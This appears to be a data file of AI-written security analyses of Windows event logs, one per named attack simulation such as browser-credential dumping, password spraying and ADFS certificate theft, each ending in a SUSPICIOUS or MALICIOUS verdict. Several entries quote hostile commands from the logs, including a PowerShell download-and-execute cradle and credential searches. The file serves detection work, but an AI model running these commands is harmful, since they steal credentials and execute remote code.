GPP Passwords (findstr),"In analyzing the provided Windows event logs from the host ""Server002"", several observations can be made to assess the context of the activities captured in these logs. The key focus is on identifying any indicators of potential malicious activity.

**Security Log Observations:**
1. **EventID 4616**: These are mostly related to the system time change, which can sometimes indicate attempts to evade detection by altering timestamps but it seems more aligned to regular operations where `svchost.exe` is involved, typically a benign process if not being manipulated by other means. However, these events are noted but do not directly indicate suspicious activity.

**Application Log Observations:**
1. **Edge Update Events**: There are multiple logs indicating that the ""EdgeUpdate"" service has stopped. While application updates and service interruptions can be routine, the frequency and timing might call for a closer look to ensure these are not being exploited as a cover for other activities.

**Sysmon Log Observations:**
1. **PowerShell Execution**: There are events indicating that PowerShell is being executed by a user account (`SERVER002\\admin_test`). PowerShell usage must be assessed carefully, as it is often used in scripting and administrative tasks but can also be leveraged by attackers for malicious purposes. No specific command lines indicating malicious actions were recorded, but further scrutiny might be warranted.
   
2. **`wevtutil.exe` Usage**: The process `wevtutil.exe`, seen being executed multiple times, can be used for legitimate log management tasks but is also potentially used by attackers to clear event logs. The context and frequency of its use here seem potentially suspicious and would benefit from further investigation.
   
3. **`cmd.exe` Command**: A noteworthy command executed involves searching for “cpassword” within XML files in the sysvol folder. This is a common technique to discover Group Policy Preferences files that might contain passwords, indicating a potential attempt to elevate privileges within the network.

4. **Other Executions**: The executions of `whoami.exe` and `hostname.exe` are indicative of gaining information about the system and possibly establishing environmental context. This activity can be benign but can also be part of reconnaissance steps taken by an attacker.

**System Log Observations:**
1. Logs related to system time adjustments again suggest routine time synchronization activities but should be monitored in case there are anomalies over extended periods.

**Assessment & Guidance:**

Based on the review and analysis of the event logs:
- There is some evidence suggesting **SUSPICIOUS** activity particularly due to:
  - Frequent command-line utility executions (e.g., `whoami`, `cmd.exe` for `cpassword` search).
  - Usage of `wevtutil.exe`.
  - PowerShell usage without explicit malicious commands seen but merits caution due to known abuse potential.

**Resolution: SUSPICIOUS**

**Recommended Steps for Further Action:**
1. **Deeper Investigation**: Conduct a deeper investigation into the usage context of PowerShell commands and examine if specific scripts or unusual connections to external IP addresses have occurred.
   
2. **Monitor Accounts**: Pay particular attention to the `admin_test` account and determine if the actions correlate with legitimate administrator activities at the time noted.
   
3. **Review Use of `wevtutil.exe`**: Validate whether these executions were authorized and for what purpose to rule out log tampering.
   
4. **Audit Group Policy Files**: Check if the “cpassword” search attempt exposed any unnecessary configurations and rectify security policies for Group Policy Preferences if required.

By following these steps, you can ensure due diligence over the potential threats that may lurk between routine administrative actions and outliers signaling compromise."
WinPwn - PowerSharpPack - Sharpweb for Browser Credentials,"After thoroughly reviewing the provided Windows event logs, we can derive some insights that allow us to determine whether there are any indicators of malicious activity. Here is a detailed analysis:

1. **System Log:**
   - The logs mostly contain events related to the Kernel-General provider, specifically concerning time updates. This is relatively benign, as some system processes periodically synchronize with time servers to ensure correct system time.
   
2. **Windows PowerShell Log:**
   - There are multiple PowerShell events indicating the execution of the command:
     ```
     powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
     Invoke-Sharpweb -command ""all""}
     ```
   - This is highly suspicious because the command attempts to download a script from a GitHub repository and execute it using `Invoke-Expression (iex)`, which is often associated with malicious code execution.

3. **Security Log:**
   - The security events are related to time changes, similar to the system logs. They appear usual and do not indicate malicious activity.

4. **Sysmon Log:**
   - Multiple activities such as the launch of `whoami.exe`, `conhost.exe`, and others are recorded. The most notable event is the execution of PowerShell, which matches the suspicious command from the PowerShell log.
   - The persistence of various svchost and EdgeUpdate-related processes appears benign as they are related to Microsoft Edge updates and system services.

5. **Application Log:**
   - Contains benign events related to the Windows Defender being on and several EdgeUpdate services stopping. Nothing directly malicious is observed here.

### Assessment:

- The direct execution of a PowerShell script from an external source (GitHub) using `iex` is strongly indicative of malicious intent or at least unwanted actions. Such activities are often used in fileless attacks or downloading and running malicious payloads.

### Conclusion:
Based on the above analysis, the presence of direct PowerShell script execution from an untrusted source constitutes a clear indicator of malicious activity.

### Resolution:
- **MALICIOUS:** The logs contain activity that is unequivocally malicious. Immediate investigation and mitigation steps should be taken to address this potential security breach.

### Recommended Actions:
- **Isolate the affected system** to prevent further propagation.
- **Conduct a full malware scan** and monitor any suspicious outgoing network connections.
- **Review access logs and user activity** for the Server002 to determine potential unauthorized access.
- **Patch and update** all software to the latest versions to close any exploits used.
- Strengthen **PowerShell logging, Restrict execution policies**, and educate users about suspicious PowerShell commands.

These steps will help contain the incident and prevent similar occurrences in the future."
WinPwn - passhunt,"After analyzing the provided event logs from the Windows host, here is a detailed assessment of the situation:

### 1. **System Log**
- The system log entries primarily indicate regular system activities such as time adjustments and Windows Time service updates.
- There are no abnormal time changes or privilege escalations that stand out as anomalous or suspicious in these entries.

### 2. **Application Log**
- The application log records seem normal, showing Windows Defender to be actively in its `SECURITY_PRODUCT_STATE_ON` status, which suggests that the antivirus is functioning properly.
- The Software Protection Platform Service entries also seem routine and consistent with normal operations.

### 3. **Sysmon Log**
- **Multiple process executions** such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are listed, which could signify administrative operations. However, the presence of a PowerShell instance executing a script from the internet is a major red flag.
- The PowerShell command appears to be downloading and executing a script from a suspicious URL on GitHub (related to the ""S3cur3Th1sSh1t"" repository), indicative of potential malicious activity. This kind of behavior is often associated with attempts to download and execute potentially harmful scripts or payloads on a system.

### 4. **Windows PowerShell Log**
- The PowerShell logs confirm the execution of a suspicious PowerShell command that downloads and attempts to run a script from a potentially harmful repository. This is a strong indicator of potentially malicious activity.

### 5. **Security Log**
- **User activity** is logged with events identifying successful logins with elevated privileges (Event ID 4672), associated with the user account `admin_test`. The privileges included such as `SeDebugPrivilege`, `SeImpersonatePrivilege`, and `SeLoadDriverPrivilege` add context for concern when coupled with the PowerShell activity.

### Conclusion and Resolution
- The execution of PowerShell commands to download scripts from non-official or non-trusted sources stands out as **malicious activity**.
- This particular behavior indicates a compromise attempt, as the downloaded script could potentially execute unauthorized or harmful tasks.
  
### Resolution: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Containment:** Isolate the affected host from the network to prevent further propagation of any potential threats.
2. **Forensic Analysis:** Conduct a deeper forensic investigation of the host to determine the impact and scope of the compromise.
3. **User Activity Review:** Review additional user activity linked to `admin_test` to ascertain if the account is compromised.
4. **Patch and Update:** Ensure all systems are patched and anti-virus definitions are up to date.

6. **Monitoring and Alerts:** Increase monitoring on other systems in the environment for similar suspicious activities.
7. **Security Awareness:** Educate users on the risks of executing foreign scripts and adherence to security policies."
Search for Passwords in Powershell History,"Upon analyzing the provided Windows event logs, the following points are drawn regarding suspicious or anomalous activities observed:

1. **Time Change Events**:
   - The security and system logs report several Event ID 4616 and Event ID 1, indicating that the system time was changed multiple times. This could be indicative of an attempt to alter event timestamps to conceal malicious activities. Time alteration often suggests attempts to erase traces or to align system timestamps with malicious payload execution.

2. **PowerShell Execution**:
   - In the Sysmon logs, Event ID 1 indicates the execution of PowerShell with a potentially suspicious command: 
     ```
     powershell.exe & {ls -R C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String \""password\"", \""-p\"", \""key\"", \""pwd\"", \""pass\""}
     ```
   - This command attempts to recursively list files and search for terms related to credentials (""password"", ""key"", etc.). This behavior is indicative of credential scraping or attempts to find sensitive information, which is highly suspicious.

3. **Frequent Execution of Administration Commands**:
   - The Sysmon logs show frequent execution of utility commands like `hostname.exe` and `whoami.exe`. While not inherently malicious, their frequent invocation could be an attempt to map the system or enumerate user privileges.

4. **Service Executions and Updates**:
   - Multiple instances of MicrosoftEdgeUpdate and related executable files are being executed as seen in the Sysmon and Application logs. These could be legitimate background update processes, but given the timing and frequency of executions surrounding other suspicious events, this warrants further scrutiny to ensure they were not leveraged for a malicious purpose.

**Assessment**:
The combination of time alteration events, potentially credential scraping PowerShell command, and suspicious frequency of administrative command execution raises considerable concern.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Conduct a thorough investigation of the system to identify any unauthorized access or manual tampering.
- Review the integrity of executable files, especially the ones related to Edge update processes for legitimacy.
- Perform a comprehensive security scan of the host to detect any malware.
- Implement stricter monitoring of PowerShell scripts and access times if not already in place.
- Consider reviewing and auditing user accounts for unauthorized privileges or anomalies in access patterns.

Further investigation is required to determine if these activities are indeed part of a malicious attempt or if there are any benign explanations, such as system misconfigurations or legitimate but poorly scheduled tasks."
Azure - Dump All Azure Key Vaults with Microburst,"Upon analyzing the provided logs from the Windows machine, several patterns and events raise flags:

1. **Suspicious Privilege Usage**: In the Security logs, Event ID 4672 is triggered, indicating special privileges being assigned to the user `admin_test`. These privileges include SeDebugPrivilege, SeTakeOwnershipPrivilege, SeBackupPrivilege, SeRestorePrivilege, and others, often granted to high-privilege users. While these privileges are needed for administrative tasks, if not expected, they can indicate an insider threat or compromised account.

2. **Persistent PowerShell Usage**: There are frequent instances of PowerShell being executed by the user `admin_test` (Sysmon EventID 1). In some cases, PowerShell is being used to import and execute scripts located in a temporary directory, which hints at potentially unauthorized or malicious script execution. The script `Get-AzurePasswords.ps1`, especially with a suspicious path from a temp directory, is seemingly being used to extract credentials from Azure. This type of activity, especially involving credential access, can be highly indicative of malicious intent.

3. **Unauthorized Access to Log Events**: Multiple instances of `wevtutil.exe` executions are logged, which is a utility used to query and manage event logs. Unsanctioned usage of this tool is often associated with attempts to cover tracks by clearing event logs or monitoring for specific system events.

4. **Process Anomalies**: The creation and execution of processes like `csc.exe` (C# Compiler) and `cvtres.exe` (Resource Conversion Utility) in user directories are unusual for standard user activities and warrant further analysis for malicious file creation or modification attempts.

5. **Network Activities via NTLM**: The NTLM logins from an external workstation (`DESKTOP-3HL5B2P`) using the `admin_test` account with elevated privileges are potentially unauthorized, especially if this workstation is not recognized or associated with typical administration activities.

**Assessment & Recommended Actions**:

- **Suspicious**: This system exhibits indicators of compromise. Unusual authentication logins with elevation of privileges, suspicious use of PowerShell scripts potentially accessing sensitive credentials, and execution of system utilities typically associated with malicious intentions suggest possible malicious activity.

1. **Immediate Actions**: Disconnect the machine from the network to prevent further unauthorized access or data exfiltration. Change passwords and check the integrity and legitimacy of user accounts, especially `admin_test`.

2. **Forensic Investigation**: Perform a detailed forensic analysis, especially focusing on the accessed Azure credentials, the execution history of PowerShell scripts, and authentication logs. Cross-reference with known benign activities involving the workstation DESKTOP-3HL5B2P.

3. **System Hardening**: Configure logging to alert on suspicious PowerShell usage and privilege escalation activities. Tighten access controls, especially on admin accounts, and enforce stricter monitoring.

Based on findings, it is classified as:
- **Resolution**: SUSPICIOUS"
Simulating access to Windows Firefox Login Data,"Upon analyzing the provided Windows event logs, here are the observations and findings regarding potential malicious activities:

### 1. PowerShell Logs Analysis

- **Observed Command:**
  - `Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles"" -Force -Recurse`
  
- **Analysis:**
  - The use of PowerShell to recursively copy Mozilla Firefox profile data to a local temporary directory is suspicious. The destination path includes a double-dot (`..`) sequence, indicating potential directory traversal to an unauthorized location.
  - The command lacks a clear legitimate purpose and could suggest data exfiltration or preparation for further unauthorized access.
  
### 2. Security Logs Analysis

- **Security Event 4624 (Logon):**
  - This event is a successful logon event using the ""SYSTEM"" user, which by itself isn't necessarily malicious.
  
- **Security Event 4672 (Special Privileges Assigned):**
  - The Special Privileges event indicates SeDebugPrivilege and other high-tier privileges granted to the ""SYSTEM"" account. While not immediately anomalous, it highlights the potential for impactful system changes or exploitation if an account with such privileges is compromised.

### 3. Sysmon Logs Analysis

- **Observed Processes:**
  - Multiple `conhost.exe`, `wevtutil.exe`, and `windowsPowerShell.exe` processes initiated by the `SERVER002\admin_test` user.
  
- **Suspicious Activities:**
  - Frequent creation of `wevtutil.exe` processes can indicate potential clearing or querying of event logs, which could be used by an attacker to hide tracks.
  - The `admin_test` account frequently initiating PowerShell and console processes warrants further verification with regards to normal user behavior.

### Conclusion

- **Indicators of Compromise:**
  - The utilization of PowerShell for copying browser profiles without obvious justification.
  - Multiple executions of potentially log-clearing utilities (`wevtutil.exe`).
  - Elevated privileges assigned to a process without obvious legitimate context.

- Based on the analysis, this activity appears potentially threatening, suggesting atypical behavior that could align with various post-exploitation techniques.

### Resolution

- **SUSPICIOUS**
  - The activities observed in these logs suggest potentially malicious intent but require further investigation to confirm malicious actions and intent.
  
### Recommendations for Next Steps:

1. **Conduct User Activity Review:** Verify the legitimacy of the actions performed by the `SERVER002\admin_test` user and assess if such actions are typical based on role requirements.

2. **Investigate Directory Access and Data Movement:** Check for subsequent network activity or external storage usage immediately following the PowerShell activity for indications of data exfiltration.

3. **Audit System and Security Logs:** Ensure thorough exploration of logs for additional indicators or correlated activities related to suspicious account usage or privilege escalations.

4. **Network Traffic Analysis:** Investigate any unusual outbound traffic that aligns with the timestamp of the suspicious PowerShell activity.

5. **Contain and Monitor:** If necessary, contain the account `admin_test`, enforce stringent monitoring, and block any unauthorized access paths until clearance.

By addressing these vectors, the potential compromise can be validated or mitigated accordingly."
Azure - Dump Azure Instance Metadata from Virtual Machines,"In analyzing the provided Windows event logs, I've identified several activities that stand out for further scrutiny.

### Findings:

1. **PowerShell Activity**:
   - There is a PowerShell command executing a script that involves invoking a REST method and converting the response to JSON. This activity attempts to access metadata typically associated with cloud services, using the IP address `169.254.169.254`. This IP is commonly used for accessing instance metadata in cloud environments (like Azure, AWS), which may not typically be accessed in regular on-premises environments without explicit intent.
   - The output is being redirected to a temporary file (`data.005Test2.txt`) in the `$env:temp` directory, which could indicate data exfiltration or unauthorized data collection.

2. **Service Host Processes**:
   - Multiple entries for svchost.exe seem to involve routine service activities such as time updates and system tasks. These appear normal given the provided time updates and system interactions logged.

3. **Process Execution**:
   - There is a sequence of events showing execution of processes like `whoami.exe`, `hostname.exe`, and system management tasks (wevtutil.exe) carried out by the `admin_test` user, and overseen by `wsmprovhost.exe`. Although it is generally normal for system administration, the context should be clarified as repetitive execution of these processes can sometimes warrant further investigation.

4. **Sysmon Logs**:
   - Detailed process creation logs in Sysmon show interactions largely focused on legitimate Windows system utilities and are associated with the same user admin account. However, we notice the recurring execution of `whoami.exe` and `hostname.exe`. While they are legitimate tools, these commands are sometimes used by attackers for reconnaissance purposes.

5. **Networking Services**:
   - Regular services like `sppsvc.exe` (Software Protection Platform Service) and `WmiPrvSE.exe` (WMI Provider Host) are logged which usually are normal system operations. 

### Conclusion and Recommendations:

- **Resolution**: **SUSPICIOUS**

The PowerShell execution involving the REST query stands out as potentially suspicious due to:
- The network address targeted (`http://169.254.169.254`) suggests potential attempts to access cloud service metadata, typically automatic on cloud-hosted machines, but suspicious if not part of expected operations.
- The use of `ConvertTo-Json` and file redirection to a potentially unauthorized location indicates possible data exfiltration or reconnaissance.

Given these observations:
1. **Forensic Analysis**: Conduct a deeper inspection of the PowerShell activity. Check if the script corresponds to known operations or is a potential security misconfiguration or exploitation attempt.
2. **Monitor Network Traffic**: If cloud services are relevant, ensure any access to instance metadata IPs like `169.254.169.254` is intended and within scope. Monitor for unusual outgoing data transfer.
3. **Audit User Activity**: Authenticate `admin_test` activities, especially around the noted times, ensuring validity and need for performed operations.

Further engagement with involved stakeholders (IT and incident response teams) and review of role-based accesses and network configurations is suggested to determine if anomalies are based on environment specifics or indicative of malicious activity."
Access unattend.xml,"Upon reviewing the provided Windows event logs, I will summarize the potentially significant observations:

1. **Multiple Processes with Elevated Privileges**:
   - The execution of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` under the `NT AUTHORITY\SYSTEM` user is observed. Normally, these processes are legitimate, used for updating Microsoft Edge. However, executing from a temporary directory like `C:\Program Files (x86)\Microsoft\Temp\EU6111.tmp\` is atypical and could indicate potential tampering.
   
2. **Repeated Execution of Administrative Tools**:
   - There are numerous instances of the `wevtutil.exe` and `conhost.exe` processes being executed by the user `SERVER002\admin_test`. The `wevtutil.exe` is commonly used for managing and querying event logs. Frequent execution could indicate someone attempting to clear or manipulate logs, which may be suspicious especially when used together with `conhost.exe`.
   
3. **Execution of `cmd.exe` with Specific Commands**:
   - The `cmd.exe` was executed with the command-line to read files such as `unattend.xml`. These files often contain sensitive information like administrative passwords, used during automated Windows setup processes. This action is suspicious as it may indicate an attempt to extract such information.

4. **Manipulation of Time Settings**:
   - In the system logs, there are kernel entries indicating changes in system time initiated by `svchost.exe`. If these changes are unauthorized, they could be used to obfuscate log timelines for malicious activity.

5. **Common Administrative Tools**:
   - The execution of `whoami.exe` and `hostname.exe` is typically benign administrative activity to identify user details and machine name, respectively. These are not overtly malicious but give context to user actions.

**Assessment of the Situation**:
- There are several activities and anomalies that warrant immediate attention. The presence of MicrosoftEdgeUpdate.exe being executed from a temporary directory, the use of cmd.exe to access potentially sensitive XML files, and repetitive use of wevtutil.exe for event log handling suggests unusual behavior.

**Threats or Risks Identified**:
- Potential unauthorized access or privilege escalation.
- Attempts at reconnaissance or data exfiltration.
- Potential cleanup or obfuscation activities to hide tracks.

**Guidance on How to Proceed**:
- Conduct a deeper forensic analysis on the identified suspicious processes and files.
- Verify if the Edge update files are untampered and legitimately sourced.
- Check system integrity, especially for the event log files and system time alterations.
- Investigate the intent and actions under the `SERVER002\admin_test` account.
- Ensure all administrative passwords are secure and consider changing them.

**Resolution**:
- **SUSPICIOUS**: The logs contain signs of potentially unauthorized and anomalous activity that requires further investigation to confirm whether it's malicious or benign administrative actions. Immediate action should be taken to monitor and review system logs and activities in detail."
Extracting passwords with findstr,"Based on the detailed examination of the provided logs, several observations are noted:

1. **Windows System Logs**:
   - The system logs indicate time adjustments related to the system clock. These adjustments are expected behavior and do not exhibit signs of malicious activity.

2. **Windows PowerShell Logs**:
   - The PowerShell logs display the invocation of PowerShell with a command searching for files containing the term ""password"" across various file types (e.g., .xml, .doc, .txt). The usage of `findstr` and `select-string` commands to search for potentially sensitive information (such as ""pass"" and ""password"") is highly suspicious, as this behavior is typically associated with attempts to exfiltrate credentials or sensitive data. This is often indicative of malicious reconnaissance behavior.

3. **Sysmon Logs**:
   - Sysmon logs show the execution of various processes, including svchost.exe, conhost.exe, and whoami.exe. The sequence and nature of these processes, by themselves, do not necessarily indicate a compromise.
   - Crucially, the Sysmon logs also reveal the starting of PowerShell with a command identical to the one seen in the PowerShell logs, confirming the suspicious activity noted earlier.
   - The presence of wevtutil.exe being run multiple times could be normal, but in conjunction with PowerShell activities, critical examination is warranted.
   - Multiple activities related to Microsoft Edge Update appear to be standard update processes with expected parent/child processes.

4. **Security Logs**:
   - The security logs show normal operations such as time changes and privileged account activities by NT AUTHORITY\SYSTEM, which are routine and expected within a system environment.

**Assessment and Conclusion**:
- The primary concern extracted from the logs is the execution of a PowerShell command designed to search directories for files containing potential credential-related terms, which is a common indicator of malicious intent, especially if conducted without authorization.
- The combination of PowerShell scripting looking for sensitive data, especially related to passwords, is indicative of possible malware or an intruder's reconnaissance phase within the network.

**Resolution**: 
- **SUSPICIOUS** - The logs contain activity that doesn't align with typical user actions and needs further investigation. There are no definitive signs of a compromise but the PowerShell activity necessitates an immediate inquiry to either rule out or confirm malicious intent.

**Guidance on How to Proceed**:
- Conduct a thorough review of the PowerShell execution logs to determine the context of this search and verify if it aligns with any authorized security assessments or internal processes.
- Isolate the machine if further suspicious activities are detected during the investigation phase.
- Engage Incident Response to conduct a more detailed forensic analysis if malicious activity is confirmed.
- Educate system administrators and users on recognizing and reporting any potentially unauthorized access or activities."
List Credential Files via PowerShell,"## Analysis of the Windows Event Logs

### Security Log Analysis
The security logs include several `EventID 4616`, which indicates changes to the system time. This can potentially be an indication of tampering with system logs. However, the process involved is `svchost.exe`, which is a legitimate system process, tasked with handling various services. Given no direct evidence of misuse, the slight time discrepancy is not necessarily malicious, but unusual if there is no accompanying system event like daylight saving time changes or timezone updates.

### PowerShell Log Analysis
The PowerShell logs show execution with potential credential access attempts:

- **HostApplication:** `powershell.exe & {$usernameinfo = (Get-ChildItem Env:USERNAME).Value Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\ Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\}`
- The script attempts to access hidden directories associated with user credentials. Such actions could be indicative of credential harvesting or malicious reconnaissance activities, typical in advanced persistent threats or malware seeking sensitive information.

### System Log Analysis
System logs align with security logs showing changes to the system time, involving the same `svchost.exe` process. No additional suspicious activities were identified, as these events are consistent with the associated changes in system time.

### Application Log Analysis
The application logs primarily show routine actions attributed to the Edge Update service, which is standard behavior for system updates and not indicative of malicious activity.

### Sysmon Log Analysis
The Sysmon logs reveal a detailed sequence of process creations and executions:

- Several processes are consistent with legitimate system updates (`MicrosoftEdgeUpdate.exe`), which align with software updates and maintenance tasks.
- Of particular interest is the execution of `powershell.exe` with a command that aligns exactly with the suspicious PowerShell activity identified earlier. This reiterates the potential credential access risk observed in the PowerShell logs.

## Assessment and Conclusion
The logs show evidence of a legitimate system update via Microsoft Edge Update, with corresponding process creations and standard auto-update behavior. However, the PowerShell activity explicitly attempting to access user credential directories is highly suspicious:

- **Anomalies:** Attempts by PowerShell to access directories containing user credentials.
- **Indicators of Compromise:** The use of PowerShell scripts targeting user data systematically implies potential malicious intent for credential theft.

Given the suspicious PowerShell activity targeting sensitive directories for information that could compromise user credentials, the logs are flagged as **SUSPICIOUS** and recommend further investigation to determine the intent and source of this PowerShell command.

## Guidance on Further Action
1. **Immediate Investigation:** A detailed investigation should be undertaken to determine how and why these PowerShell commands were executed.
2. **Endpoint Security Review:** Review antivirus/endpoint logs for alerts around the time of this activity.
3. **User Access Logs:** Check logs for unauthorized access or unusual login attempts related to `admin_test` or other sensitive accounts.
4. **Network Traffic Analysis:** Examine network logs for any data exfiltration attempts following this PowerShell activity.
5. **Credential Monitoring:** Users whose credentials could have been accessed should be prompted to change their passwords and monitor their accounts for unusual activity.

It is important to ensure that this potential threat is entirely understood and mitigated to prevent credential theft and unauthorized access."
Password Spray all Domain Users,"Upon analyzing the provided Windows event logs, several patterns and indicators suggest potential malicious activity. Here’s a detailed analysis:

1. **Suspicious Command Execution:**
   - Multiple instances of `cmd.exe` and associated `conhost.exe` are observed executing command lines with conditional checks (`if not exist %%temp%%\\users.txt`) and script executions (e.g., `parse_net_users.bat`). Batch script execution like `parse_net_users.bat` from the Temp directory, particularly under a high integrity level, is highly suspicious as it could indicate automated scripts or malware attempting to harvest user information or conduct reconnaissance.

2. **Credential Access Attempt:**
   - The command execution pattern `@FOR /F %%n in (%%temp%%\\users.txt) do @echo | set/p=. & ` indicates an attempt to enumerate users and possibly attempt connections using predefined credentials (`Spring2020`). This is highly indicative of an attempt to access other systems using common or default credentials.

3. **Privilege & Process Monitoring:**
   - The user `SERVER002\\admin_test` is seen initiating processes frequently with high integrity, indicating processes are running with elevated privileges that could potentially be leveraged by malware for broader access or persistence.
   - Event ID `4672` shows privilege assignment (`SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.`), which are sensitive and should be closely monitored as they allow process manipulation, observing these being used by the same user can depict account misuse.

4. **Scripting Activity in Temp Directory:**
   - The presence of scripts and batch files in the `Temp` directory without corresponding documentation or legitimate usage history suggests that these may have been placed and executed by potentially unauthorized or unrecognized applications.

5. **Time Anomaly in System Logs:**
   - System and security logs indicate a possible time alteration or anomaly (Event ID 4616 with mismatched `OldTime` and `NewTime`). Time changes can be utilized by attackers to circumvent detection mechanisms.

6. **Multiple Invocations of `wevtutil.exe`:**
   - The repeated execution of `wevtutil.exe`, a Windows utility to manage event log data, could be utilized for clearing event logs to cover tracks.

7. **Unusual Network Utilization Execution:**
   - There is a command trying to use `net use` to map drives or access IPC shares with a password specified, which is often associated with lateral movement attempts within a network.

Given these observations, the activities recorded in the logs are consistent with suspicious and potentially malicious behavior, focusing significantly on recon, lateral movement, and credential access patterns prevalent in cyber attacks.

### Assessment and Resolution:
- **Resolution:** MALICIOUS
- **Actions:**
  - Immediately isolate the affected host to prevent further propagation or information leakage.
  - Conduct a thorough investigation to confirm any data breach or unauthorized access.
  - Scan for additional indicators of compromise (IOCs).
  - Review and audit user account activities, particularly those with elevated privileges.
  - Verify and secure all privileged accounts and update any shared credentials.
  - Ensure comprehensive logging and monitoring is reinstated or initiated.

This analysis signifies that a comprehensive threat hunting exercise is essential to ascertain the full extent of the compromise."
Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials],"Upon analyzing the given Windows event logs, here is the breakdown of the findings:

1. **PowerShell Activity:**
   - Observed an interesting PowerShell command: `powershell.exe & {vaultcmd /listcreds:\""Web Credentials\"" /all}`. This command was executed via PowerShell which lists credentials stored under ""Web Credentials"" in the Windows Vault. This could suggest an attempt to enumerate stored web credentials on the system.
   - Repeated execution of similar commands with PowerShell suggests targeting data specifically focused on credential access.

2. **System Logs:**
   - Standard system activity observed with Windows updates and time synchronization processes. These entries do not indicate any anomalies or suspicious behavior.

3. **Security Logs:**
   - Changes in system time are logged, and although the shifting times are recorded (EventID: 4616), this alone does not constitute suspicious behavior unless correlated with other malicious activity like editing logs to hide trails. 

4. **Application Logs:**
   - Normal activity related to the Windows Defender being active.
   - The ""edgeupdate"" service stopped, which aligns with the Sysmon logs where Edge updates were performed. This aligns with routine system maintenance.

5. **Sysmon Logs:**
   - A series of events captured extensive Edge Update processes such as `MicrosoftEdgeUpdate.exe` and related executables for logging purposes or to ensure updates are properly applied.
   - Notably, however, repeated legitimate processes such as `whoami.exe`, `hostname.exe`, and `VaultCmd.exe` being run under a high-integrity level frequently indicates potential exploratory actions to gather system information or enumerate credentials, respectively.

**Threat Assessment:**
- The PowerShell execution of `vaultcmd` stands out as potentially suspicious. The use of PowerShell to query stored web credentials indicates an action that should be investigated further, as such behavior aligns with data collection phases of intrusion.
- Given the elevated integrity levels and regular examinations of the credentials, this warrants further examination to determine if the activity was authorized or linked to possible unauthorized credential access attempts.

**Conclusion:**
Based on the analysis of the logs, the resolution is determined to be **SUSPICIOUS**. The activities related to credential access through PowerShell appear anomalous and should be further investigated to rule out or confirm malicious intent. It is recommended to:
- Review the user context and purpose behind running the `vaultcmd` command.
- Verify any recent changes to user-access privileges or access logs that might indicate unauthorized access.
- Ensure that no credentials were improperly accessed or exfiltrated.

This further exploration can help clarify the legitimacy or malicious nature of these activities."
ADFS token signing and encryption certificates theft - Remote,"After reviewing the provided logs from the Windows host, here's a detailed analysis of the activity observed:

### Analysis

1. **Security Log:**
   - The events (EventID 4616) in the security log are related to time change events. These indicate potential attempts to manipulate system time, which could be suspicious if done at inappropriate times or without justification.

2. **Sysmon Log:**
   - Several executions of `wevtutil.exe`, `powershell.exe`, and other command line utilities such as `whoami.exe` and `hostname.exe` are recorded. Notably:
     - `powershell.exe` executed with command lines indicating attempts to load sensitive modules and possibly perform DC Sync attack (extracting credentials). Commands are trying to manipulate and extract ADFS service account information which is a clear indicator of malicious intent.
     - `wevtutil.exe` is often used to clear event logs, which can be suspicious if executed frequently and without administrative tasks as justification.
   - Multiple `conhost.exe` process executions are observed, which can be normal, but given the context of other events, should be considered in the broader investigation.
   - The use of `AADInternals` PowerShell module indicates potential unauthorized attempts to interact with Azure AD and related environments.

3. **Windows PowerShell Log:**
   - The main activity centers around the execution of AADInternals module with attempts to extract sensitive configuration from Active Directory Federated Services (ADFS).
   - Active use of `ConvertTo-SecureString` and `New-Object -TypeName System.Management.Automation.PSCredential` to create secure credentials for further operations.

4. **Application Log:**
   - The primary entries are related to the Edge Update service starting and stopping, which aligns with normal update operations, unless manipulated by malicious processes.
   - However, the frequent stopping of the Edge Update service in a short span of time could indicate it was being used as a vector or distraction for other activities.

5. **General Windows System Log:**
   - Similar timestamp activities related to system processes involve time synchronization adjustments.

### Assessment
Based on the evidence from the Sysmon and Security event logs, there are clear signs of malicious activity. The use of PowerShell to import AADInternals and engage in operations that suggest a DC Sync attack, alongside `wevtutil.exe` executions, reflects a method often used for lateral movement or credential dumping within a network. 

### Resolution
**MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Action:**
   - Isolate the affected system from the network to prevent any further unauthorized access or lateral movement.
   - Conduct a thorough examination to confirm any extracted sensitive data and determine the extent of unauthorized access.

2. **Forensic Analysis:**
   - Examine any potential dropped files, further logs, and network connections established during the suspicious period.
   - Review user account activities and perform credential resets for potentially compromised accounts.

3. **Preventive Measures:**
   - Enhance monitoring of PowerShell activities and lock down administrative access.
   - Strengthen endpoint security by implementing and configuring application whitelisting and restrictive policy settings for PowerShell usage.

4. **Incident Response:**
   - Follow through with a complete incident response procedure, including reporting and documentation for future security posture improvements.
   - Conduct root cause analysis to address vulnerabilities or shortcomings in security measures that allowed the breach."
